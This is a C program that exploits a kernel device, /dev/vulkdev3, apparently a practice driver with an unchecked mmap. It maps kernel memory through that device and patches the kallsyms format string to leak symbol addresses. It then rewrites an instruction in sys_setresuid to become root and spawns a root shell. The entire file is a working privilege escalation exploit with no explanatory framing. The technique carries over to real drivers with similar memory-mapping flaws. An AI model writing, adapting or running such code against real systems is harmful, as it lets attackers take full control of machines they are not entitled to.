#define _GNU_SOURCE 1
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

#define VULKDEV_DEVICE "/dev/vulkdev3"
#define KERNEL_ADDR 0xc0000000

unsigned long get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sym[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f)
		return 0;
  
	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
		if (ret == 0) {
			fscanf(f, "%s\n", sym);
			continue;
		}
		if (!strcmp(name, sym)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);
  
	return 0;
}

int main(int argc, char* argv[])
{
	int fd;
	uid_t uid;
	size_t size;
	char *addr;
	unsigned long start;
	off_t offset;

	fd = open(VULKDEV_DEVICE, O_RDWR);
	if (fd < 0) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	size = 0x7ffe0000;
	start = 0x42424000;
	offset = 0x00000000;
	addr = (char *)mmap((void *)start, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
	if (addr == MAP_FAILED) {
		printf("mmap failed, errno = %d\n", errno);
		close(fd);
		return -1;
	}
	printf("mmap addr: %lx\n", (unsigned long)addr);
	uid = getuid();
	printf("uid = %d\n", uid);

	unsigned long sys_setresuid = 0;
	printf("search string \"%%pK %%c %%s\" in memory...\n");
	char *p = (char *)addr;
	while (p < addr + size - 0x40) {
		if (!strcmp(p, "%pK %c %s\n")) {
			printf("found string, addr = %p\n", p);
			printf("patch string...\n");
			p[2] = ' ';
                        printf("patch string: %s\n", p);
			sys_setresuid = get_symbol("sys_setresuid");
			break;
		}
		p++;
	}
	if (sys_setresuid) {
		printf("sys_setresuid = 0x%lx\n", sys_setresuid);
		char *p2 = (char *)(sys_setresuid - KERNEL_ADDR + addr);
		char *end = p2 + 0x1000;
		while (p2 < end) {
			if (*((unsigned int *)p2) == 0xf9835375) {
				printf("found target opcode, addr=%p\n", p2);
				printf("patch opcode...\n");
				*((unsigned int *)p2) = 0xf9835374;
				setresuid(0, 0, 0);
				*((unsigned int *)p2) = 0xf9835375;
				p[2] = 'K';
				break;
			}
			p2++;
		}
	}
	if (getuid() == 0) {
		printf("GOT ROOT!\n");
		execl("/bin/sh", "sh", NULL);
	}
	return 0;
}

